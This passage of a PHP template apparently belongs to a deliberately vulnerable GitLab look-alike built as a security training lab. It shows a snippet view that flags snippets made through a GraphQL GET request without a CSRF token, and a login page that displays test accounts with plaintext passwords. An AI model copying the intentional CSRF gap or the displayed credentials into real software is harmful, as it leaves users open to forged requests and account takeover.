      <div class="gl-snippet<?= $isCsrf ? ' csrf-created' : '' ?>">
        <div class="gl-snip-header">
          <div class="gl-snip-icon">
            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm-1 1.5L18.5 9H13V3.5zM8 12h8v1H8zm0 3h8v1H8zm0 3h5v1H8z"/></svg>
          </div>
          <div>
            <div class="gl-snip-title"><?= esc($s['title']) ?></div>
            <div style="font-size:.68rem;color:rgba(255,255,255,.35);margin-top:1px;"><?= esc($s['filename'] ?: 'snippet') ?></div>
          </div>
          <div class="gl-snip-meta">
            <?php if ($isCsrf): ?>
            <span class="gl-badge badge-csrf">⚡ CSRF Created</span>
            <?php endif; ?>
            <span class="gl-badge <?= $badgeClass ?>"><?= ucfirst($s['visibility']) ?></span>
            <span class="gl-snip-lang"><?= esc($lang) ?></span>
          </div>
        </div>
        <div class="gl-snip-body">
          <pre class="gl-snip-code"><?= esc($s['content']) ?></pre>
        </div>
        <div class="gl-snip-footer">
          <span class="gl-snip-date">Created <?= date('M j, Y · H:i', strtotime($s['created_at'])) ?></span>
          <?php if ($isCsrf): ?>
          <span style="margin-left:auto;font-size:.65rem;color:rgba(252,109,38,.7);font-weight:600;">Created via GET /gl/api/graphql — no CSRF token</span>
          <?php endif; ?>
        </div>
      </div>
      <?php endforeach; ?>
      <?php endif; ?>
    </div>
  </main>
</div>

<script>
function toggleForm() {
    var p = document.getElementById('newSnipForm');
    p.classList.toggle('open');
}

function createSnippetPost() {
    var title    = document.getElementById('snipTitle').value.trim();
    var content  = document.getElementById('snipContent').value.trim();
    var filename = document.getElementById('snipFilename').value.trim() || 'snippet.txt';
    var vis      = document.getElementById('snipVis').value;
    var msg      = document.getElementById('formMsg');

    if (!title || !content) {
        msg.style.display = 'block';
        msg.style.color = '#fca5a5';
        msg.textContent = 'Title and content are required.';
        return;
    }

    var query = 'mutation CreateSnippet($input: CreateSnippetInput!) { createSnippet(input: $input) { errors snippet { webUrl } } }';
    var variables = { input: { title: title, content: content, filePath: filename, visibilityLevel: vis, uploadedFiles: [], projectPath: '', blobActions: [] } };

    msg.style.display = 'block';
    msg.style.color = '#6b7280';
    msg.textContent = 'Creating snippet…';

    fetch('/index.php?action=graphql', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': '<?= esc($csrfToken) ?>'
        },
        body: JSON.stringify({ query: query, variables: variables })
    })
    .then(r => r.json())
    .then(data => {
        if (data.errors) {
            msg.style.color = '#fca5a5';
            msg.textContent = '✗ ' + data.errors[0].message;
        } else {
            msg.style.color = '#2da160';
            msg.textContent = '✓ Snippet created! Reloading…';
            setTimeout(() => location.reload(), 800);
        }
    })
    .catch(() => {
        msg.style.color = '#fca5a5';
        msg.textContent = '✗ Network error';
    });
}
</script>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="gl-login-body">
  <div class="gl-login-wrap">
    <div class="gl-login-logo">
      <svg width="36" height="36" viewBox="0 0 380 380" fill="none">
        <path d="M190 350L287 55H93L190 350Z" fill="#e24329"/>
        <path d="M190 350L93 55L10 55L190 350Z" fill="#fc6d26"/>
        <path d="M10 55L62 215L190 350L10 55Z" fill="#fca326"/>
        <path d="M190 350L287 55L370 55L190 350Z" fill="#fc6d26"/>
        <path d="M370 55L318 215L190 350L370 55Z" fill="#fca326"/>
      </svg>
      <span class="gl-login-logo-text">GitLab</span>
    </div>

    <div class="gl-login-card">
      <div class="gl-login-title">Sign in to GitLab</div>

      <?php if ($error): ?>
      <div class="gl-error-banner"><?= esc($error) ?></div>
      <?php endif; ?>

      <form method="POST" action="/index.php">
        <div class="gl-field">
          <label>Email or username</label>
          <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
        </div>
        <div class="gl-field">
          <label>Password</label>
          <input type="password" name="password" placeholder="Your password" required autocomplete="current-password">
        </div>
        <button type="submit" class="gl-login-submit">Sign in</button>
      </form>

      <div style="background:#1E1E2E;border:1px solid #2D2D3F;border-radius:6px;padding:10px 12px;margin:12px 0;font-size:11px;">
        <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#6B7280;margin-bottom:8px;">📋 Test Accounts</div>
        <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #0D0D1A;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">kai.jordan@gitlab.com</span><span style="font-family:monospace;font-weight:700;color:#E2E8F0;font-size:11px;white-space:nowrap;">kai@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#1E2A3A;color:#60A5FA;white-space:nowrap;">Dev</span></div>
        <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #0D0D1A;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">zoe.kim@gitlab.com</span><span style="font-family:monospace;font-weight:700;color:#E2E8F0;font-size:11px;white-space:nowrap;">zoe@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#1E2A3A;color:#60A5FA;white-space:nowrap;">Dev</span></div>
        <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#6B7280;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">leo.santos@gitlab.com</span><span style="font-family:monospace;font-weight:700;color:#E2E8F0;font-size:11px;white-space:nowrap;">leo@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#1E2A3A;color:#60A5FA;white-space:nowrap;">Dev</span></div>
      </div>

      <div class="gl-login-divider">or</div>

      <button class="gl-social-btn" disabled>
        <svg viewBox="0 0 24 24"><path d="M20.317 10.492c0-.66-.057-1.293-.163-1.9H12v3.59h4.661a3.985 3.985 0 01-1.729 2.61v2.169h2.8c1.636-1.507 2.585-3.727 2.585-6.469z" fill="#4285F4"/><path d="M12 21c2.34 0 4.303-.776 5.736-2.099l-2.8-2.17c-.777.52-1.769.828-2.936.828-2.258 0-4.17-1.524-4.852-3.572H4.26v2.24A9 9 0 0012 21z" fill="#34A853"/><path d="M7.148 13.987A5.41 5.41 0 016.862 12c0-.69.12-1.36.286-1.987V7.773H4.26A9.007 9.007 0 003 12c0 1.452.349 2.826.26 4.026l2.888-2.04z" fill="#FBBC05"/><path d="M12 6.576c1.272 0 2.41.438 3.309 1.296l2.48-2.48C16.3 3.991 14.338 3 12 3A9 9 0 004.26 7.774l2.888 2.24C7.83 8.1 9.742 6.576 12 6.576z" fill="#EA4335"/></svg>
        Continue with Google
      </button>
      <button class="gl-social-btn" disabled style="color:#888;">
        <svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
        Sign in with GitHub
      </button>

      <div class="gl-login-sub">
        Don't have an account? <a href="#">Register now</a>
      </div>
    </div>

    <div style="margin-top:16px;font-size:.7rem;color:#4a4a4a;text-align:center;">
      GitLab Community Edition · <a href="#" style="color:#555;">Help</a>
    </div>
  </div>
</div>
<?php endif; ?>

</body>
</html>
